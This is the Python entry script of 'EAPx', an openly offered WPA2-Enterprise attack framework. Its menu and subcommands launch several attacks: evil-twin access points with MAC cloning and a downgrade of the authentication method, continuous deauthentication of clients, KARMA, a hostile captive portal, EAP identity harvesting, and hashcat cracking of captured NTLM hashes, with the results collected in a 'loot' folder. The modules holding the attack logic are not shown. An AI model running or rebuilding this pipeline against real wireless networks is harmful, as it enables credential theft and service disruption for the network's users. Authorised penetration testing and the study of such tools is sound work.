#!/usr/bin/env python3
import argparse
import sys
import os
import shutil
import threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

BANNER = """
███████╗ █████╗ ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝
█████╗  ███████║██████╔╝ ╚███╔╝
██╔══╝  ██╔══██║██╔═══╝  ██╔██╗
███████╗██║  ██║██║     ██╔╝ ██╗
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
  WPA2-Enterprise Attack Framework
  github.com/babySAMRAT/eapx
  For authorized pentesting only
"""

REQUIRED = ["hostapd", "airmon-ng", "aireplay-ng",
            "airodump-ng", "openssl", "macchanger", "iwconfig"]


def check_deps():
    missing = [b for b in REQUIRED if shutil.which(b) is None]
    if missing:
        print(f"[!] Missing tools: {', '.join(missing)}")
        print(f"[!] Run: sudo apt install -y {' '.join(missing)}")
        sys.exit(1)
    print("[+] All dependencies found\n")


def validate_interfaces(iface_ap, iface_mon):
    """Validate that two interfaces are distinct and exist on the system."""
    if iface_ap == iface_mon:
        print(f"[!] AP interface and monitor interface must be different!")
        print(f"[!] You provided '{iface_ap}' for both.")
        print(f"[!] Use two separate wireless adapters.")
        sys.exit(1)

    for name, iface in [("AP", iface_ap), ("Monitor", iface_mon)]:
        if not os.path.exists(f"/sys/class/net/{iface}"):
            print(f"[!] {name} interface '{iface}' not found on this system.")
            print(f"[!] Available interfaces:")
            try:
                for dev in os.listdir("/sys/class/net"):
                    print(f"      - {dev}")
            except OSError:
                pass
            sys.exit(1)

    print(f"[+] AP interface:      {iface_ap}")
    print(f"[+] Monitor interface: {iface_mon}")
    print()


# ── Commands ────────────────────────────────────────────────────

def cmd_setup(args):
    check_deps()
    from modules.cert_wizard import generate_certs
    generate_certs()
    print("\n[+] Setup complete. You can now run attacks.")


def cmd_scan(args):
    check_deps()
    from modules.scanner import scan_enterprise_networks
    nets = scan_enterprise_networks(args.iface, args.time)
    if not nets:
        print("[!] No WPA2-Enterprise networks found.")
    else:
        print(f"\n[+] Found {len(nets)} enterprise network(s)")


def cmd_attack(args):
    check_deps()
    validate_interfaces(args.iface_ap, args.iface_mon)

    essid = bssid = None
    channel = args.channel

    if not args.essid:
        from modules.scanner import interactive_target_select
        target = interactive_target_select(args.iface_mon, args.scan_time)
        if not target:
            sys.exit(1)
        essid   = target["essid"]
        bssid   = target["bssid"]
        channel = int(target["channel"])
    else:
        essid = args.essid
        bssid = getattr(args, "bssid", None)

    attacks_run = []

    if args.probe and bssid:
        from modules.eap_probe import probe_eap_methods
        probe_eap_methods(args.iface_mon, bssid, essid)
        attacks_run.append("EAP Method Probe")

    if args.harvest:
        from modules.identity import harvest_identities
        harvest_identities(args.iface_mon, duration=30)
        attacks_run.append("EAP Identity Harvesting")

    if args.autocrack:
        from modules.autocrack import watch_and_crack
        t = threading.Thread(target=watch_and_crack, daemon=True)
        t.start()
        attacks_run.append("Auto-Crack Pipeline")

    if bssid and args.deauth:
        from modules.deauth import deauth_attack
        t = threading.Thread(
            target=deauth_attack,
            args=(args.iface_mon, bssid, None, 0),
            daemon=True
        )
        t.start()
        attacks_run.append(f"Deauth → {bssid}")

    attacks_run.append(f"Evil Twin AP → {essid} ch{channel} [{args.negotiate}]")

    from modules.rogue_ap import launch_ap
    launch_ap(
        iface=args.iface_ap,
        ssid=essid,
        channel=channel,
        negotiate=args.negotiate,
        bssid=bssid if args.clone_mac else None,
        boost_tx=args.boost
    )

    if args.report:
        from report.reporter import generate_report
        generate_report(essid, bssid or "unknown", channel, attacks_run)


def cmd_deauth(args):
    check_deps()
    from modules.deauth import deauth_attack
    count = 0 if args.continuous else args.count
    deauth_attack(args.iface, args.bssid,
                  getattr(args, "client", None), count)


def cmd_harvest(args):
    check_deps()
    from modules.identity import harvest_identities
    harvest_identities(args.iface, args.time)


def cmd_karma(args):
    check_deps()
    from modules.karma import start_karma
    start_karma(args.iface)


def cmd_portal(args):
    check_deps()
    from modules.rogue_ap import launch_ap
    from modules.hostile_portal import start_portal
    t = threading.Thread(
        target=launch_ap,
        kwargs=dict(
            iface=args.iface,
            ssid=args.essid,
            channel=args.channel,
            negotiate="balanced",
            bssid=None,
            boost_tx=True
        ),
        daemon=True
    )
    t.start()
    start_portal()


def cmd_crack(args):
    from modules.autocrack import crack_hash
    with open(args.file) as f:
        for line in f:
            line = line.strip()
            if line:
                crack_hash(line, args.mode)


def cmd_report(args):
    from report.reporter import generate_report
    generate_report(
        getattr(args, "essid", "unknown"),
        getattr(args, "bssid", "unknown"),
        getattr(args, "channel", 6),
        ["Manual report generation"]
    )


def cmd_menu(args):
    print(BANNER)
    print("╔══════════════════════════════════════╗")
    print("║         SELECT ATTACK MODE           ║")
    print("╠══════════════════════════════════════╣")
    print("║  1.  Setup (certs + dep check)       ║")
    print("║  2.  Scan enterprise networks        ║")
    print("║  3.  Full auto attack                ║")
    print("║  4.  Evil twin + creds only          ║")
    print("║  5.  Deauth attack                   ║")
    print("║  6.  KARMA attack                    ║")
    print("║  7.  Passive identity harvest        ║")
    print("║  8.  Hostile portal                  ║")
    print("║  9.  Crack hashes                    ║")
    print("║  10. Generate report                 ║")
    print("╚══════════════════════════════════════╝")
#in crack hashes ..in future te user can load his custom wordlist
    choice = input("\n[?] Enter number: ").strip()

    # Modes 3/4 need dual interfaces, others need a single interface
    if choice in ("3", "4"):
        iface_ap  = input("[?] AP interface (e.g. wlan1): ").strip()
        iface_mon = input("[?] Monitor interface (e.g. wlan0mon): ").strip()
    elif choice in ("1", "9", "10"):
        iface_ap = iface_mon = None  # not needed
    else:
        iface = input("[?] Interface (e.g. wlan0mon): ").strip()

    class A: pass

    if choice == "1":
        a = A()
        cmd_setup(a)

    elif choice == "2":
        a = A(); a.iface = iface; a.time = 15
        cmd_scan(a)

    elif choice == "3":
        essid = input("[?] Target ESSID (blank = auto-scan): ").strip() or None
        bssid = input("[?] Target BSSID (blank if auto): ").strip()     or None
        ch    = input("[?] Channel (default 6): ").strip()               or "6"
        mode  = input("[?] Negotiate [balanced/gtc-downgrade/default]: ").strip() or "balanced"
        a = A()
        a.iface_ap=iface_ap; a.iface_mon=iface_mon
        a.essid=essid; a.bssid=bssid
        a.channel=int(ch); a.negotiate=mode; a.scan_time=15
        a.deauth=True; a.clone_mac=True; a.boost=True
        a.probe=True; a.harvest=True; a.autocrack=True; a.report=True
        cmd_attack(a)

    elif choice == "4":
        essid = input("[?] Target ESSID: ").strip()
        bssid = input("[?] Target BSSID (optional): ").strip() or None
        ch    = input("[?] Channel (default 6): ").strip() or "6"
        mode  = input("[?] Negotiate [balanced/gtc-downgrade/default]: ").strip() or "balanced"
        a = A()
        a.iface_ap=iface_ap; a.iface_mon=iface_mon
        a.essid=essid; a.bssid=bssid
        a.channel=int(ch); a.negotiate=mode; a.scan_time=15
        a.deauth=False; a.clone_mac=False; a.boost=True
        a.probe=False; a.harvest=False; a.autocrack=False; a.report=False
        cmd_attack(a)

    elif choice == "5":
        bssid  = input("[?] Target AP BSSID: ").strip()
        client = input("[?] Client MAC (blank = broadcast): ").strip() or None
        a = A(); a.iface=iface; a.bssid=bssid
        a.client=client; a.continuous=True; a.count=100
        cmd_deauth(a)

    elif choice == "6":
        a = A(); a.iface = iface
        cmd_karma(a)

    elif choice == "7":
        t = input("[?] Duration in seconds (default 60): ").strip() or "60"
        a = A(); a.iface=iface; a.time=int(t)
        cmd_harvest(a)

    elif choice == "8":
        essid = input("[?] ESSID for open AP: ").strip()
        ch    = input("[?] Channel (default 6): ").strip() or "6"
        a = A(); a.iface=iface; a.essid=essid; a.channel=int(ch); a.boost=True
        cmd_portal(a)

    elif choice == "9":
        f = input("[?] Hash file path: ").strip()
        m = input("[?] Mode [5500=NTLMv1 / 5600=NTLMv2]: ").strip() or "5500"
        a = A(); a.file=f; a.mode=int(m)
        cmd_crack(a)

    elif choice == "10":
        essid = input("[?] ESSID: ").strip() or "unknown"
        bssid = input("[?] BSSID: ").strip() or "unknown"
        ch    = input("[?] Channel: ").strip() or "6"
        a = A(); a.essid=essid; a.bssid=bssid; a.channel=int(ch)
        cmd_report(a)

    else:
        print("[!] Invalid option")


# ── Argument Parser ─────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        prog="eapx",
        description="WPA2-Enterprise Attack Framework",
        formatter_class=argparse.RawTextHelpFormatter
    )
    sub = parser.add_subparsers(dest="command")

    # menu
    sub.add_parser("menu", help="Interactive guided menu")

    # setup
    sub.add_parser("setup", help="Generate certs + check dependencies")

    # scan
    p = sub.add_parser("scan", help="Scan for WPA2-Enterprise networks")
    p.add_argument("-i", "--iface", required=True,
                   help="Monitor-mode interface")
    p.add_argument("-t", "--time",  type=int, default=15)

    # attack  ── requires TWO interfaces
    p = sub.add_parser("attack", help="Full attack pipeline (dual-interface)")
    p.add_argument("-a", "--iface-ap",  required=True,
                   help="Interface for rogue AP (e.g. wlan1)")
    p.add_argument("-m", "--iface-mon", required=True,
                   help="Monitor-mode interface for deauth/scan/harvest (e.g. wlan0mon)")
    p.add_argument("--essid",           default=None)
    p.add_argument("--bssid",           default=None)
    p.add_argument("--channel",         type=int, default=6)
    p.add_argument("--negotiate",
                   choices=["balanced","gtc-downgrade","default"],
                   default="balanced")
    p.add_argument("--no-deauth",    dest="deauth",    action="store_false", default=True)
    p.add_argument("--no-clone-mac", dest="clone_mac", action="store_false", default=True)
    p.add_argument("--no-boost",     dest="boost",     action="store_false", default=True)
    p.add_argument("--no-probe",     dest="probe",     action="store_false", default=True)
    p.add_argument("--no-harvest",   dest="harvest",   action="store_false", default=True)
    p.add_argument("--no-autocrack", dest="autocrack", action="store_false", default=True)
    p.add_argument("--no-report",    dest="report",    action="store_false", default=True)
    p.add_argument("--scan-time",    type=int, default=15)

    # deauth
    p = sub.add_parser("deauth", help="Deauthentication attack")
    p.add_argument("-i", "--iface",  required=True,
                   help="Monitor-mode interface")
    p.add_argument("--bssid",        required=True)
    p.add_argument("--client",       default=None)
    p.add_argument("--count",        type=int, default=100)
    p.add_argument("--continuous",   action="store_true")

    # harvest
    p = sub.add_parser("harvest", help="Passive EAP identity harvesting")
    p.add_argument("-i", "--iface", required=True,
                   help="Monitor-mode interface")
    p.add_argument("-t", "--time",  type=int, default=60)

    # karma
    p = sub.add_parser("karma", help="KARMA attack")
    p.add_argument("-i", "--iface", required=True,
                   help="Wireless interface for KARMA AP")

    # portal
    p = sub.add_parser("portal", help="Hostile captive portal")
    p.add_argument("-i", "--iface",   required=True,
                   help="Interface for rogue AP")
    p.add_argument("--essid",         required=True)
    p.add_argument("--channel",       type=int, default=6)

    # crack
    p = sub.add_parser("crack", help="Crack hash file with hashcat")
    p.add_argument("-f", "--file", required=True)
    p.add_argument("-m", "--mode", type=int, default=5500,
                   help="5500=NTLMv1  5600=NTLMv2")

    # report
    p = sub.add_parser("report", help="Generate pentest report")
    p.add_argument("--essid",   default="unknown")
    p.add_argument("--bssid",   default="unknown")
    p.add_argument("--channel", type=int, default=6)

    args = parser.parse_args()

    dispatch = {
        "menu":    cmd_menu,
        "setup":   cmd_setup,
        "scan":    cmd_scan,
        "attack":  cmd_attack,
        "deauth":  cmd_deauth,
        "harvest": cmd_harvest,
        "karma":   cmd_karma,
        "portal":  cmd_portal,
        "crack":   cmd_crack,
        "report":  cmd_report,
    }

    if args.command in dispatch:
        dispatch[args.command](args)
    else:
        parser.print_help()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n")
        print("╔══════════════════════════════════════╗")
        print("║        🛑  EAPx Shutting Down        ║")
        print("╠══════════════════════════════════════╣")
        print("║  All processes stopped cleanly.      ║")
        print("║  Check loot/ for captured data.      ║")
        print("╚══════════════════════════════════════╝")
        sys.exit(0)
